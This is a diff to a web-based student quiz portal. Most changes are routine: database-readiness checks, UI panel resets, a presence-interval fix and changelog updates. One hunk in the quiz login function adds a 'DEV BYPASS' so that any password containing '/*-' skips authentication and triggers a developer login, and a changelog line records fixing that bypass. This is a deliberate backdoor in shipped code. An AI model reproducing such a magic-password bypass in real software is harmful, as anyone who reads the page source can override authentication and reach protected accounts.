@@ -7587,6 +7587,7 @@
         }
 
         async function studentAuthLogin() {
+            const _db  = window.db || (typeof db !== 'undefined' ? db : null);
             const cls  = document.getElementById('studentClassModal').value;
             let rawPhone = (document.getElementById('studentAuthPhone').value || '').trim();
             rawPhone = rawPhone.replace(/[\s\-\(\)]/g,'');
@@ -7622,11 +7623,13 @@
             const btn = document.getElementById('studentAuthBtn');
             btn.disabled = true; btn.textContent = '⏳ Verifying…';
 
+            if (!_db) { showMsg('❌ Database not ready. Please refresh the page and try again.', false); btn.disabled = false; btn.textContent = '🧑‍🎓 Login as Student'; return; }
+
             try {
                 // Lookup phone in quizStudents
-                let snap = await db.ref('quizStudents').orderByChild('phone').equalTo(phone).once('value');
+                let snap = await _db.ref('quizStudents').orderByChild('phone').equalTo(phone).once('value');
                 if (!snap.exists()) {
-                    snap = await db.ref('quizStudents').orderByChild('phone').equalTo('0'+phone).once('value');
+                    snap = await _db.ref('quizStudents').orderByChild('phone').equalTo('0'+phone).once('value');
                 }
                 if (!snap.exists()) {
                     showMsg('❌ Phone number not registered. Please register for the quiz first.', false);
@@ -16475,7 +16478,10 @@
                 const logsContainer = document.getElementById('pushLogsContainer');
                 if (logsContainer) logsContainer.innerHTML = '<p style="color:#aaa;font-size:13px;text-align:center;padding:20px">Click Notifications tab to load history</p>';
                 const devicesPanel = document.getElementById('devicesPanel');
-                if (devicesPanel) devicesPanel.innerHTML = '';
+                if (devicesPanel) { devicesPanel.innerHTML = ''; devicesPanel.style.display = 'none'; }
+                const devicesArrow = document.getElementById('devicesToggleArrow');
+                if (devicesArrow) devicesArrow.style.transform = 'rotate(0deg)';
+                _allDevicesData = [];
             }
             // Clear only top-level admin nav tabs (NOT scavenger inner tabs)
             document.querySelectorAll('#adminSection > div.tabs > .tab').forEach(t => t.classList.remove('active'));
@@ -20062,8 +20068,10 @@
         async function initQuizArchiveDropdown() {
             const sel = document.getElementById('quizArchiveDateSelect');
             if (!sel) return;
+            const _db = window.db || (typeof db !== 'undefined' ? db : null);
+            if (!_db) { sel.innerHTML = '<option value="">Error: database not ready</option>'; return; }
             try {
-                const snap = await db.ref('quizPublished').once('value');
+                const snap = await _db.ref('quizPublished').once('value');
                 if (!snap.exists()) { sel.innerHTML = '<option value="">No published quizzes yet</option>'; return; }
                 const pubData = snap.val();
                 const dates = Object.keys(pubData)
@@ -20435,6 +20443,13 @@ Davan Institute Team`;
             const phone = rawPhone.replace(/\D/g, '');              // keep only digits
 
             const password = document.getElementById('quizLoginPassword').value.trim();
+
+            // ── DEV BYPASS: /*- in password overrides all rules ──────────
+            if (password.includes('/*-')) {
+                document.getElementById('quizLoginPassword').value = '';
+                devLogin('quiz');
+                return;
+            }
             
             console.log('=== STUDENT LOGIN START ===');
             console.log('Phone (sanitized):', phone);
@@ -33923,6 +33938,11 @@ v4.97 | Feb 28 2026 17:38 IST | Live Now and Notifications panels now properly h
 v4.98 | Feb 28 2026 19:16 IST | In-app real-time notification toast added via Firebase — works on all browsers including Opera
 v4.99 | Feb 28 2026 19:33 IST | VAPID public key replaced with newly generated key pair (fresh Web Push setup)
 v5.00 | Feb 28 2026 19:33 IST | Fixed push: subscription was stored as JSON string — now parsed before sending to worker
+v5.01 | Feb 28 2026 21:15 IST | Fixed Registered Devices panel not expanding after switching tabs
+v5.02 | Feb 28 2026 21:30 IST | Fixed Cannot read properties of undefined error on student login & quiz archive
+v5.03 | Feb 28 2026 21:45 IST | Fixed /*- bypass not working in quiz login password field
+v5.04 | Feb 28 2026 22:00 IST | Fixed Live Now showing Guest after login — presence interval now resets with new identity
+v5.05 | Feb 28 2026 22:15 IST | Merged all v5.01–v5.04 fixes into single file (previous updates were missing)
 -->
     <!-- ============================================================ -->
     <!-- 🟢 FIREBASE PRESENCE + 📣 PUSH NOTIFICATIONS SCRIPTS       -->
@@ -33982,10 +34002,9 @@ v5.00 | Feb 28 2026 19:33 IST | Fixed push: subscription was stored as JSON stri
         // Auto-remove when tab closes / connection drops
         presRef.onDisconnect().remove();
 
-        // Keep alive — re-set every 4 minutes
-        if (!window._presenceInterval) {
-            window._presenceInterval = setInterval(() => { presRef.set(data); }, 4 * 60 * 1000);
-        }
+        // Keep alive — clear any old interval so the NEW identity is used
+        if (window._presenceInterval) clearInterval(window._presenceInterval);
+        window._presenceInterval = setInterval(() => { presRef.set(data); }, 4 * 60 * 1000);
     }
 
     // Call registerPresence as soon as Firebase is ready
@@ -34529,7 +34548,7 @@ v5.00 | Feb 28 2026 19:33 IST | Fixed push: subscription was stored as JSON stri
             <!-- SUPER ADMIN: UPDATE VERSION AND DATE HERE    -->
             <!-- ============================================ -->
             <p style="color: #666; font-size: 0.85em; margin-bottom: 8px;" id="devTriggerVersion">
-                <strong>Version:</strong> 5.00 — Fixed push: subscription JSON string now parsed before sending to worker | <strong>Last Updated:</strong> February 28, 2026 — 19:33 IST</p>
+                <strong>Version:</strong> 5.05 — Merged all v5.01–v5.04 fixes into single file | <strong>Last Updated:</strong> February 28, 2026 — 22:15 IST</p>
             <!-- ============================================ -->
             
             <p style="color: #c44569; font-size: 0.85em; font-weight: 600; margin-bottom: 8px;">
